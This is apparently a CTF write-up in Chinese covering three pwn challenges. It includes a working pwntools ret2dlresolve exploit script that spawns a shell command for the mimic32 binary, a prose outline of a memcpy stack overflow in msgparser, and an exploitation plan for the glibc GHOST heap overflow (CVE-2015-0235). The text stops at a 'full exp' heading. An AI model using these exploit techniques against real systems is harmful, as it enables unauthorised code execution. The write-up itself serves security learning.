## **mimic-game**

  
    拟态题目，语言实现同一个程序，最后通过 obs 同时运行。    Mimic32 guess 输出的时候有个栈溢出：![](../Images/6d31cd95dbe76e1dc66dcca0288f4a0b.png)  
    程序是 32 位、RELRO 是部分保护 ret2dlsolved 利用，直接套 pwntools 生成 payload 模板：msgparser

```
from pwn import \*
context.log\_level\="debug"
context.terminal = \['tmux','sp','-h'\]
context.binary = elf = ELF('./mimic32')
context.arch = 'i386'
p = process("./mimic32")
\# gdb.attach(p,"b \*0x080489A7")
\# pause()
rop = ROP(context.binary)
dlresolve = Ret2dlresolvePayload(elf,symbol\="system",args\=\["/bin/sh -c 'cat flag'"\])
rop.read(0,dlresolve.data\_addr)
rop.ret2dlresolve(dlresolve)
raw\_rop = rop.chain()
\# print (rop.dump())
payload = flat({48:raw\_rop,80:dlresolve.payload})
p.sendlineafter(">> ",str(1))
p.sendafter("> ",payload)
p.interactive()
```

  
  
  

## **msgparser**

##    memcpy 这里存在栈溢出，a1 是个栈地址，ptr 是 post 包的数据，len 是从 post 包 Content-Length 提取出来。

![](../Images/4ea823243aee5b13d28d8c4a52e80f1d.png)    最后溢出的时候用的是 memcpy ，会存在 \\x00 截断，需要一字节一字节的清空，然后再写入 onegadget 到 main 函数的返回地址。


## **ghost**

  
    此题是CVE-2015-0235 glibc \_\_nss\_hostname\_digits\_dots 堆溢出漏洞，如果输入的是数字，gethostbyname\_r函数就会存在8个字节的溢出。     
    参考https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/7.1.2\_glibc\_2015-0235.html    由于glibc版本是2.15的，所以我们要用patchelf工具去加载so和ld库`cd /lib64/``sudo ln -s /home/zzq/shanshi/game/2021/dianfengjike/ghost/ld.so.2 ./15_ld_.so.2``patchelf --set-interpreter /lib64/15_ld_.so.2 ./pwn``patchelf --replace-needed libc.so.6 ./libc.so.6 ./pwn`    可以通过输入直接溢出修改size。![](../Images/bf1033423cde8a4232836b3a5fe8870a.png)![](../Images/c7f127c7b695560a316451c10cb41a2f.png)     思路就是通过堆叠泄露libc的基地址，然后直接改fastbin的fd指针为malloc hook的地址，改malloc hook为one\_gadget的地址。**    完整exp**
